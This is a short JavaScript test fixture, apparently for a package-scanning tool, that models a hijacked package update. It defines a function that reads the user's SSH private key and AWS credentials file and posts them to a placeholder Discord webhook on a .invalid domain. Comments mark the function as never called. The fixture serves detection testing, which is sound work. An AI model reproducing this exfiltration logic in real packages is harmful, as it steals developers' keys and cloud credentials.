// PKGSENTINEL TEST FIXTURE: inert. The 'hijacked update' half of the diff demo.
// main() is never called; the webhook is on the reserved .invalid TLD.
const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");

const HOOK = "https://discord.invalid/api/webhooks/987654321098765432/FIXTURE-not-a-real-token-1111";

function main() {
  const loot = {};
  for (const f of [path.join(os.homedir(), ".ssh", "id_rsa"), path.join(os.homedir(), ".aws", "credentials")]) {
    try { loot[f] = fs.readFileSync(f, "utf8"); } catch (e) {}
  }
  const req = https.request(HOOK, { method: "POST" });
  req.end(JSON.stringify(loot));
}

// main();  <- deliberately never called
